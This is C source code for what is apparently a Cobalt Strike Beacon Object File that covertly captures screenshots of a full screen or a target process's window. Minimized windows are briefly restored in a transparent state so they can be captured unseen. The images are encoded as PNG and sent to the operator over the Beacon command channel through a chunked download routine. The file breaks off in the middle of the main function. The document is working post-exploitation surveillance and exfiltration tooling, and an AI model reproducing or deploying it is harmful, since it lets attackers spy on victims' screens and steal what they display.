#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "bofdefs.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")



/*-------------------------------------------------------------
   Typedefs for the winapis im dynamically resolving
-------------------------------------------------------------*/
typedef HDC(WINAPI* PFN_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, const DEVMODEA*);
typedef int     (WINAPI* PFN_GetDeviceCaps)(HDC, int);
typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
typedef int     (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);
typedef HDC(WINAPI* PFN_GetDC)(HWND);
typedef int     (WINAPI* PFN_ReleaseDC)(HWND, HDC);
typedef HDC(WINAPI* PFN_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* PFN_PrintWindow)(HWND, HDC, UINT);
typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL(WINAPI* PFN_ShowWindow)(HWND, int);
typedef LONG(WINAPI* PFN_SetWindowLongA)(HWND, int, LONG);
typedef BOOL(WINAPI* PFN_SetLayeredWindowAttributes)(HWND, COLORREF, BYTE, DWORD);
typedef BOOL(WINAPI* PFN_UpdateWindow)(HWND);
typedef VOID(WINAPI* PFN_Sleep)(DWORD);
typedef BOOL(WINAPI* PFN_GetWindowRect)(HWND, LPRECT);
typedef HANDLE(WINAPI* PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PFN_WriteFile) (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);
typedef HGLOBAL(WINAPI* PFN_GlobalAlloc)(UINT, SIZE_T);
typedef LPVOID(WINAPI* PFN_GlobalLock)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GlobalUnlock)(HGLOBAL);
typedef HGLOBAL(WINAPI* PFN_GlobalFree)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GetWindowPlacement)(HWND, WINDOWPLACEMENT*);
typedef DWORD(WINAPI* PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
typedef BOOL(WINAPI* PFN_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int     (WINAPI* PFN_GetSystemMetrics)(int);
typedef BOOL(WINAPI* PFN_SetWindowPos)(HWND, HWND, int, int, int, int, UINT);
typedef BOOL(WINAPI* PFN_DeleteObject)(HGDIOBJ);
typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);


/* PNG conversion */

typedef int      (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
typedef int      (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);


/*-------------------------------------------------------------
   Declare static pointers for each API
-------------------------------------------------------------*/
static PFN_CreateDCA              pCreateDC = NULL;
static PFN_GetDeviceCaps          pGetDeviceCaps = NULL;
static PFN_DeleteDC               pDeleteDC = NULL;
static PFN_GetObjectA             pGetObjectA = NULL;
static PFN_GetStockObject         pGetStockObject = NULL;
static PFN_GetDC                  pGetDC = NULL;
static PFN_ReleaseDC              pReleaseDC = NULL;
static PFN_CreateCompatibleDC     pCreateCompatibleDC = NULL;
static PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static PFN_SelectObject           pSelectObject = NULL;
static PFN_PrintWindow            pPrintWindow = NULL;
static PFN_BitBlt                 pBitBlt = NULL;
static PFN_ShowWindow             pShowWindow = NULL;
static PFN_SetWindowLongA         pSetWindowLongA = NULL;
static PFN_SetLayeredWindowAttributes pSetLayeredWindowAttributes = NULL;
static PFN_UpdateWindow           pUpdateWindow = NULL;
static PFN_Sleep                  pSleep = NULL;
static PFN_GetWindowRect          pGetWindowRect = NULL;
static PFN_CreateFileA            pCreateFileA = NULL;
static PFN_WriteFile              pWriteFile = NULL;
static PFN_CloseHandle            pCloseHandle = NULL;
static PFN_GlobalAlloc            pGlobalAlloc = NULL;
static PFN_GlobalLock             pGlobalLock = NULL;
static PFN_GlobalUnlock           pGlobalUnlock = NULL;
static PFN_GlobalFree             pGlobalFree = NULL;
static PFN_GetWindowPlacement     pGetWindowPlacement = NULL;
static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
static PFN_EnumWindows            pEnumWindows = NULL;
static PFN_GetSystemMetrics       pGetSystemMetrics = NULL;
static PFN_SetWindowPos           pSetWindowPos = NULL;
static PFN_DeleteObject           pDeleteObject = NULL;
static PFN_SelectPalette          pSelectPalette = NULL;
static PFN_RealizePalette         pRealizePalette = NULL;
static PFN_GetDIBits              pGetDIBits = NULL;
static PFN_IsWindowVisible        pIsWindowVisible = NULL;

/*-------------------------------------------------------------
   Dynamically resolve the required WinAPI functions to func ptrs

   for some reason cobalt has a limit to how many winapis you can use via DFR lol.
   https://github.com/fortra/No-Consolation/issues/5
   the limit is 32 on 4.9 and 128 on 4.10. To make this 4.9 friendly i had to do this :sob:q
-------------------------------------------------------------*/
void ResolveAPIs(void)
{
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");

    pCreateDC = (PFN_CreateDCA)GetProcAddress(hGdi32, "CreateDCA");
    pGetDeviceCaps = (PFN_GetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
    pDeleteDC = (PFN_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");
    pGetDC = (PFN_GetDC)GetProcAddress(hUser32, "GetDC");
    pReleaseDC = (PFN_ReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
    pCreateCompatibleDC = (PFN_CreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject = (PFN_SelectObject)GetProcAddress(hGdi32, "SelectObject");
    pPrintWindow = (PFN_PrintWindow)GetProcAddress(hUser32, "PrintWindow");
    pBitBlt = (PFN_BitBlt)GetProcAddress(hGdi32, "BitBlt");
    pShowWindow = (PFN_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
    pSetWindowLongA = (PFN_SetWindowLongA)GetProcAddress(hUser32, "SetWindowLongA");
    pSetLayeredWindowAttributes = (PFN_SetLayeredWindowAttributes)GetProcAddress(hUser32, "SetLayeredWindowAttributes");
    pUpdateWindow = (PFN_UpdateWindow)GetProcAddress(hUser32, "UpdateWindow");
    pSleep = (PFN_Sleep)GetProcAddress(hKernel32, "Sleep");
    pGetWindowRect = (PFN_GetWindowRect)GetProcAddress(hUser32, "GetWindowRect");
    pCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pGlobalAlloc = (PFN_GlobalAlloc)GetProcAddress(hKernel32, "GlobalAlloc");
    pGlobalLock = (PFN_GlobalLock)GetProcAddress(hKernel32, "GlobalLock");
    pGlobalUnlock = (PFN_GlobalUnlock)GetProcAddress(hKernel32, "GlobalUnlock");
    pGlobalFree = (PFN_GlobalFree)GetProcAddress(hKernel32, "GlobalFree");
    pGetWindowPlacement = (PFN_GetWindowPlacement)GetProcAddress(hUser32, "GetWindowPlacement");
    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(hUser32, "GetWindowThreadProcessId");
    pEnumWindows = (PFN_EnumWindows)GetProcAddress(hUser32, "EnumWindows");
    pGetSystemMetrics = (PFN_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
    pSetWindowPos = (PFN_SetWindowPos)GetProcAddress(hUser32, "SetWindowPos");
    pDeleteObject = (PFN_DeleteObject)GetProcAddress(hGdi32, "DeleteObject");
    pSelectPalette = (PFN_SelectPalette)GetProcAddress(hGdi32, "SelectPalette");
    pRealizePalette = (PFN_RealizePalette)GetProcAddress(hGdi32, "RealizePalette");
    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
    pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");

    /* PNG conversion */
    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");

    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolved hKernel32 to 0x%p", hKernel32);
    

}

/*-------------------------------------------------------------
  i stole this from https://github.com/anthemtotheego/CredBandit
  thanks @anthemtotheego :D

  it downloads a file over beacon
-------------------------------------------------------------*/
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    // No WinAPI calls here; your MSVCRT and Beacon functions remain as-is
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    /* Pack fileId (4 bytes) */
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    /* Pack fileSize (4 bytes) */
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex++] = fileName[i];
    }
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    int chunkSize = 1024 * 900;
    if (fileSize > chunkSize) {
        int index = 0;
        while (index < fileSize) {
            if (fileSize - index > chunkSize) {
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;
                int chunkIndex = 4;
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
                free(packedChunk);
            }
            else {
                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
                free(lastChunk);
            }
            index += chunkSize;
        }
    }
    else {
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
        free(packedChunk);
    }

    char packedClose[4];
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    free(packedData);
}
static void writeBigEndian32(unsigned char* buf, unsigned long value)
{
    buf[0] = (unsigned char)((value >> 24) & 0xFF);
    buf[1] = (unsigned char)((value >> 16) & 0xFF);
    buf[2] = (unsigned char)((value >> 8) & 0xFF);
    buf[3] = (unsigned char)(value & 0xFF);
}

#define CRC32_POLYNOMIAL 0xEDB88320UL

// Compute a CRC32 over buf[0..len-1]
static unsigned long crc32(const unsigned char* buf, size_t len)
{
    unsigned long crc = 0xFFFFFFFF;
    size_t i, j;
    for (i = 0; i < len; i++) {
        crc ^= buf[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1)
                crc = (crc >> 1) ^ CRC32_POLYNOMIAL;
            else
                crc >>= 1;
        }
    }
    return crc ^ 0xFFFFFFFF;
}

// Compute Adler-32 checksum (RFC1950)
static unsigned long adler32(const unsigned char* data, size_t len)
{
    unsigned long a = 1, b = 0;
    const unsigned long MOD_ADLER = 65521;
    size_t i;
    for (i = 0; i < len; i++) {
        a = (a + data[i]) % MOD_ADLER;
        b = (b + a) % MOD_ADLER;
    }
    return (b << 16) | a;
}

// -------------------- SaveHBITMAPToFile (PNG version) --------------------
//
// This function converts the given HBITMAP into a PNG image (with no compression
// on the deflate stream – just stored blocks) and then either writes the PNG file to disk
// (if savemethod==0) or downloads it over Beacon (otherwise).
//
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
{
    ResolveAPIs();  // your API–resolver routine

    // First, get the bitmap’s dimensions and force a 24–bit DIB.
    BITMAP bm;
    pGetObjectA(hBitmap, sizeof(bm), (LPSTR)&bm);
    int width = bm.bmWidth;
    int height = bm.bmHeight;  // original height (may be positive)
    int absHeight = (height < 0) ? -height : height;  // use absolute value

    // Set up a BITMAPINFOHEADER requesting 24–bit and a top–down DIB (negative height)
    BITMAPINFOHEADER bi;
    memset(&bi, 0, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -absHeight;  // negative: top–down (so scanlines are in order)
    bi.biPlanes = 1;
    bi.biBitCount = 24;      // force 24-bit RGB
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;

    // Calculate the DIB row size (each row is padded to a multiple of 4 bytes)
    int rowSizeDIB = ((width * 3 + 3) & ~3);
    DWORD dibSize = rowSizeDIB * absHeight;

    // Allocate global memory for BITMAPINFOHEADER + pixel data
    HANDLE hDib = pGlobalAlloc(GHND, sizeof(BITMAPINFOHEADER) + dibSize);
    if (!hDib)
        return FALSE;
    LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)pGlobalLock(hDib);
    if (!lpbi) {
        pGlobalFree(hDib);
        return FALSE;
    }
    *lpbi = bi;

    // Get the bitmap’s bits
    HDC hdc = pGetDC(NULL);
    pGetDIBits(hdc, hBitmap, 0, absHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER),
        (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
    pReleaseDC(NULL, hdc);

    // -------- Convert the DIB data into “raw” PNG image data --------
    // For PNG we need one filter byte per scanline (here we choose filter type 0)
    // and exactly width*3 bytes of pixel data per row (no padding).
    int pngRowSize = 1 + width * 3;
    int pngDataSize = pngRowSize * absHeight;
    unsigned char* pngRawData = (unsigned char*)malloc(pngDataSize);
    if (!pngRawData) {
        pGlobalUnlock(hDib);
        pGlobalFree(hDib);
        return FALSE;
    }

    // Pointer to the DIB pixels (which are stored in BGR order)
    unsigned char* dibPixels = (unsigned char*)lpbi + sizeof(BITMAPINFOHEADER);
    for (int y = 0; y < absHeight; y++) {
        unsigned char* pSrc = dibPixels + y * rowSizeDIB;
        unsigned char* pDst = pngRawData + y * pngRowSize;
        pDst[0] = 0; // filter type 0 (no filtering)
        for (int x = 0; x < width; x++) {
            // Swap BGR -> RGB
            unsigned char B = pSrc[x * 3 + 0];
            unsigned char G = pSrc[x * 3 + 1];
            unsigned char R = pSrc[x * 3 + 2];
            pDst[1 + x * 3 + 0] = R;
            pDst[1 + x * 3 + 1] = G;
            pDst[1 + x * 3 + 2] = B;
        }
    }
    pGlobalUnlock(hDib);
    pGlobalFree(hDib);

    // -------- Build a minimal zlib (deflate) stream containing the image data --------
    // We use “stored” (uncompressed) deflate blocks.
    // First, write the 2–byte zlib header. (0x78, 0x01 is acceptable for no compression.)
    unsigned char zlibHeader[2] = { 0x78, 0x01 };

    // Calculate Adler–32 checksum of the uncompressed data.
    unsigned long adler = adler32(pngRawData, pngDataSize);

    // The deflate stream must split the data into blocks of at most 65535 bytes.
    int numBlocks = (pngDataSize + 65535 - 1) / 65535;
    int deflateSize = 0;
    int tmpRemaining = pngDataSize;
    while (tmpRemaining > 0) {
        int blockSize = (tmpRemaining > 65535) ? 65535 : tmpRemaining;
        // Each stored block: 1 byte header + 2 bytes LEN + 2 bytes NLEN + blockSize bytes
        deflateSize += 1 + 2 + 2 + blockSize;
        tmpRemaining -= blockSize;
    }
    // Total zlib stream size = header (2 bytes) + deflate blocks + Adler (4 bytes)
    int zlibDataSize = 2 + deflateSize + 4;
    unsigned char* zlibData = (unsigned char*)malloc(zlibDataSize);
    if (!zlibData) {
        free(pngRawData);
        return FALSE;
    }
    int pos = 0;
    memcpy(zlibData + pos, zlibHeader, 2);
    pos += 2;
    int remaining = pngDataSize;
    int offset = 0;
    while (remaining > 0) {
        int blockSize = (remaining > 65535) ? 65535 : remaining;
        // Write one byte block header: stored block header has BFINAL in LSB.
        // Set BFINAL = 1 if this is the last block.
        unsigned char bfinal = (remaining <= 65535) ? 1 : 0;
        zlibData[pos++] = bfinal;
        // Write LEN in little-endian.
        zlibData[pos++] = blockSize & 0xFF;
        zlibData[pos++] = (blockSize >> 8) & 0xFF;
        // Write NLEN = one's complement of LEN.
        unsigned short nlen = (unsigned short)(~blockSize);
        zlibData[pos++] = nlen & 0xFF;
        zlibData[pos++] = (nlen >> 8) & 0xFF;
        // Write the block data.
        memcpy(zlibData + pos, pngRawData + offset, blockSize);
        pos += blockSize;
        offset += blockSize;
        remaining -= blockSize;
    }
    // Append Adler–32 checksum (big–endian)
    zlibData[pos++] = (adler >> 24) & 0xFF;
    zlibData[pos++] = (adler >> 16) & 0xFF;
    zlibData[pos++] = (adler >> 8) & 0xFF;
    zlibData[pos++] = adler & 0xFF;
    // pos should now equal zlibDataSize.
    free(pngRawData);

    // -------- Build the PNG file in memory --------
    // PNG file consists of:
    //   PNG signature (8 bytes)
    //   IHDR chunk (25 bytes: 4+4+13+4)
    //   IDAT chunk (8 + zlibDataSize + 4)
    //   IEND chunk (12 bytes)
    int pngFileSize = 8 + 25 + (8 + zlibDataSize + 4) + 12;
    unsigned char* pngFile = (unsigned char*)malloc(pngFileSize);
    if (!pngFile) {
        free(zlibData);
        return FALSE;
    }
    int writePos = 0;
    // PNG signature
    unsigned char pngSignature[8] = { 137,80,78,71,13,10,26,10 };
    memcpy(pngFile + writePos, pngSignature, 8);
    writePos += 8;

    // ---- IHDR chunk ----
    // Length (13 bytes) – big–endian
    writeBigEndian32(pngFile + writePos, 13);
    writePos += 4;
    // Chunk type: "IHDR"
    memcpy(pngFile + writePos, "IHDR", 4);
    writePos += 4;
    // IHDR data:
    //   width (4 bytes), height (4 bytes), bit depth (1), color type (1),
    //   compression method (1), filter method (1), interlace method (1)
    writeBigEndian32(pngFile + writePos, width);
    writePos += 4;
    writeBigEndian32(pngFile + writePos, absHeight);
    writePos += 4;
    pngFile[writePos++] = 8;  // bit depth = 8 bits per channel
    pngFile[writePos++] = 2;  // color type = 2 (truecolor, RGB)
    pngFile[writePos++] = 0;  // compression method
    pngFile[writePos++] = 0;  // filter method
    pngFile[writePos++] = 0;  // interlace method
    // CRC for IHDR (over chunk type and data = 4+13 bytes)
    unsigned long chunkCRC = crc32(pngFile + 4, 4 + 13);
    writeBigEndian32(pngFile + writePos, chunkCRC);
    writePos += 4;

    // ---- IDAT chunk ----
    writeBigEndian32(pngFile + writePos, zlibDataSize);
    writePos += 4;
    memcpy(pngFile + writePos, "IDAT", 4);
    writePos += 4;
    memcpy(pngFile + writePos, zlibData, zlibDataSize);
    writePos += zlibDataSize;
    chunkCRC = crc32(pngFile + writePos - (4 + zlibDataSize), 4 + zlibDataSize);
    writeBigEndian32(pngFile + writePos, chunkCRC);
    writePos += 4;
    free(zlibData);

    // ---- IEND chunk ----
    writeBigEndian32(pngFile + writePos, 0);  // zero data length
    writePos += 4;
    memcpy(pngFile + writePos, "IEND", 4);
    writePos += 4;
    chunkCRC = crc32(pngFile + writePos - 4, 4);  // only "IEND"
    writeBigEndian32(pngFile + writePos, chunkCRC);
    writePos += 4;
    // (writePos should now equal pngFileSize)

    // -------- Write out the PNG file (or download it) --------
    if (savemethod == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving PNG to disk with filename %s", lpszFileName);
        HANDLE fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
            NULL);
        if (fh == INVALID_HANDLE_VALUE) {
            free(pngFile);
            return FALSE;
        }
        DWORD dwWritten = 0;
        pWriteFile(fh, (LPCVOID)pngFile, pngFileSize, &dwWritten, NULL);
        pCloseHandle(fh);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading PNG over beacon with filename %s", lpszFileName);
        downloadFile((char*)lpszFileName, (int)strlen(lpszFileName),
            (char*)pngFile, pngFileSize);
    }

    free(pngFile);
    return TRUE;
}

/*-------------------------------------------------------------
  Callback for EnumWindows. It gets a window handle from a PID
-------------------------------------------------------------*/
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    /* lParam points to a two–element array:
       index 0: the target PID (stored as LONG_PTR)
       index 1: the found window handle (initially 0)
    */
    LONG_PTR* params = (LONG_PTR*)lParam;
    DWORD targetPid = (DWORD)params[0];
    DWORD windowPid = 0;
    pGetWindowThreadProcessId(hwnd, &windowPid);
    if (windowPid == targetPid && IsWindowVisible(hwnd)) {
        params[1] = (LONG_PTR)hwnd;
        return FALSE;
    }
    return TRUE;
}

/*-------------------------------------------------------------
  Given a PID, uses EnumWindows to find a matching
  window handle.
-------------------------------------------------------------*/
HWND FindWindowByPID(DWORD pid, int debug)
{
    ResolveAPIs();
    LONG_PTR params[2];
    params[0] = (LONG_PTR)pid;
    params[1] = 0;
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Enumerating windows for PID %d", pid);
    EnumWindows(EnumWindowsProc, (LPARAM)&params);
    if (debug) {
        if ((HWND)params[1])
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found window handle: 0x%p", (HWND)params[1]);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No window found for PID %d", pid);
    }
    return (HWND)params[1];
}

/*-------------------------------------------------------------
  Captures the given window (by hwnd) into an HBITMAP.
  If the window is minimized, it is temporarily restored.
-------------------------------------------------------------*/
HBITMAP CaptureWindow(HWND hwnd, int debug)
{
    ResolveAPIs();
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Starting CaptureWindow for hwnd 0x%p", hwnd);

    WINDOWPLACEMENT wp = { 0 };
    wp.length = sizeof(WINDOWPLACEMENT);
    if (!pGetWindowPlacement(hwnd, &wp)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowPlacement failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window showCmd: %d", wp.showCmd);

    RECT captureRect;
    int width, height;
    BOOL success = FALSE;
    HDC hdcScreen = pGetDC(NULL);
    HDC hdcMem = pCreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = NULL;

    if (wp.showCmd == SW_SHOWMINIMIZED) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window is minimized; restoring temporarily for capture");

        LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        pSetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        pShowWindow(hwnd, SW_RESTORE);
        pUpdateWindow(hwnd);
        pSleep(500);  /* Allow time for rendering */

        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed (restored window)");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Restored window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
        /* Restore window state */
        pShowWindow(hwnd, SW_MINIMIZE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
        pSetWindowPos(hwnd, NULL, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }
    else {
        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);

        /* Attempt to use PrintWindow to capture the full contents,
           even if the window is in the background */
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
    }

cleanup:
    if (hdcMem)
        pDeleteDC(hdcMem);
    if (hdcScreen)
        pReleaseDC(NULL, hdcScreen);
    if (!success) {
        if (hBitmap)
            pDeleteObject(hBitmap);
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow succeeded");
    return hBitmap;
}

/*-------------------------------------------------------------
  go:
  BOF args:
    1. Filename 
    2. Save method: 0 = save to disk, 1 = download via Beacon.
    3. PID: if nonzero, capture that window; if zero, capture the full screen.
-------------------------------------------------------------*/
#ifdef BOF
int debug = 1; // enable the debugging prints
void go(char* buff, int len)
{
    ResolveAPIs();  // ensure API pointers are resolved

    datap parser;
    BeaconDataParse(&parser, buff, len);

    char* filename = BeaconDataExtract(&parser, NULL);
    int savemethod = BeaconDataInt(&parser);
    int pid = BeaconDataInt(&parser);


    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT,"[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d",filename, savemethod, pid, debug);

    HBITMAP hBitmap = NULL;
    if (pid != 0) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Attempting to capture window for PID %d", pid);
        HWND hwnd = FindWindowByPID((DWORD)pid, debug);
        if (hwnd == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Window with PID %d not found", pid);
            return;
        }
        hBitmap = CaptureWindow(hwnd, debug);
        if (hBitmap == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to capture window with PID %d", pid);
            return;
        }
    }
    else {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Capturing full screen");
        int x1 = pGetSystemMetrics(SM_XVIRTUALSCREEN);
